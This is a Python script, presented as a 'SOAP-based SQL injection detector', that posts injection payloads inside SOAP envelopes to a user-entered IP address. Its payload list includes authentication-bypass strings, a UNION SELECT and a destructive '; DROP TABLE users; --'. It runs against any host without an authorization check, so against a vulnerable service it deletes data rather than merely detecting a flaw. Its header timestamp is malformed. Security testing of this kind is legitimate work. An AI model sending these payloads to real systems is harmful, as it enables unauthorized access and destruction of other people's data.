# -*- coding: utf-8 -*-
"""
Created on Fri Feb  21 03:345:47 2025

@author: IAN CARTER KULANI

"""

from colorama import Fore
import pyfiglet
import os
font=pyfiglet.figlet_format("SOAP BASED SQL INJECTION DETECTOR")
print(Fore.GREEN+font)

import requests
import re

# Function to send SOAP requests and detect SQL injection vulnerabilities
def detect_soap_sql_injection(ip_address):
    print(f"Checking for potential SOAP-based SQL injection vulnerabilities on {ip_address}...\n")

    # List of common SQL injection payloads
    sql_payloads = [
        "' OR 1=1 --",  # Basic SQL injection payload
        "' OR 'a'='a'",  # Always true condition
        "'; DROP TABLE users; --",  # SQL to drop table
        "' UNION SELECT NULL, NULL, NULL --",  # SQL UNION attack
    ]

    # SOAP request template (modify based on the actual SOAP API structure)
    soap_request_template = """<?xml version="1.0" encoding="UTF-8"?>
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                      xmlns:web="http://www.example.com/webservice">
       <soapenv:Header/>
       <soapenv:Body>
          <web:getUserDetails>
             <web:userInput>{}</web:userInput>
          </web:getUserDetails>
       </soapenv:Body>
    </soapenv:Envelope>
    """

    # Base URL for testing SOAP endpoint (adjust the path based on the actual SOAP API)
    base_url = f"http://{ip_address}/soapendpoint"  # Modify this to match the actual SOAP service endpoint

    for payload in sql_payloads:
        # Construct the SOAP request with the payload
        soap_request = soap_request_template.format(payload)

        try:
            # Send the SOAP request to the target API
            headers = {
                "Content-Type": "text/xml;charset=UTF-8",
                "SOAPAction": "http://www.example.com/webservice/getUserDetails"  # Modify SOAPAction if needed
            }

            response = requests.post(base_url, data=soap_request, headers=headers)

            # Check for signs of SQL injection in the response (e.g., error messages or abnormal responses)
            if "error" in response.text.lower() or re.search(r"syntax|error|unclosed|unexpected", response.text, re.IGNORECASE):
                print(f"[!] Potential SOAP-based SQL injection vulnerability detected with payload: {payload}")
                print(f"Response contains error or unusual output: {response.text[:300]}...")  # Print part of the response for debugging
            else:
                print(f"[+] No SOAP-based SQL injection detected with payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Error making request for payload {payload}: {e}")

# Main function to prompt the user and start the detection process
def main():
    
    # Prompt the user for an IP address to test for SOAP-based SQL injection
    ip_address = input("Enter the target IP address:")

    # Start detecting SOAP-based SQL injection vulnerabilities
    detect_soap_sql_injection(ip_address)

if __name__ == "__main__":
    main()
